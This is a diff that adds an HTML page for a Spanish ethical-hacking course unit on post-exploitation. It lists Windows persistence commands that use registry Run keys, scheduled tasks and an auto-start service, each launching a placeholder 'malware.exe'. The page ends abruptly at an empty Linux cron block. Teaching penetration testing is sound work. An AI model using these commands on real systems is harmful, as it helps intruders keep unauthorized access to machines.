@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unidad 8 - Ethical Hacking 2026</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
+        h1 { color: #2c3e50; }
+        a { color: #3498db; }
+    </style>
+</head>
+<body>
+    <h1>Unidad 8: Ethical Hacking</h1>
+    <p><a href="../index.html">← Volver al índice</a></p>
+    <hr>
+    <div class="content">
+# Unidad 8: Post-Explotación, Reporte y Ética
+
+## Objetivos de Aprendizaje
+
+- **Ejecutar** técnicas de post-explotación y mantenimiento de acceso.
+- **Escalar** privilegios en sistemas comprometidos.
+- **Generar** reportes profesionales de pentesting.
+- **Aplicar** el marco ético y legal de la profesión.
+
+---
+
+## Contenido Teórico
+
+### 8.1 Post-Explotación
+
+La post-explotación abarca las actividades después de obtener acceso inicial: mantener acceso, escalar privilegios y exfiltrar datos.
+
+#### Persistence Mechanisms
+
+**Windows**:
+
+**Registry Run Keys**:
+```powershell
+# Agregar al inicio
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyService" /t REG_SZ /d "C:\malware.exe"
+
+# HKLM para todos los usuarios
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyService" /t REG_SZ /d "C:\malware.exe"
+```
+
+**Scheduled Tasks**:
+```powershell
+# Crear tarea programada
+schtasks /create /tn "MyTask" /tr "C:\malware.exe" /sc daily /st 09:00
+
+# Con PowerShell
+Register-ScheduledTask -TaskName "MyTask" -Action (New-ScheduledTaskAction -Execute "malware.exe") -Trigger (New-ScheduledTaskTrigger -Daily -At 9am)
+```
+
+**Services**:
+```powershell
+# Crear servicio malicioso
+sc create "MyService" binPath= "C:\malware.exe" start= auto
+sc start "MyService"
+```
+
+**Linux**:
+
+**Cron Jobs**:
+```bash
+    </div>
+</body>
+</html>
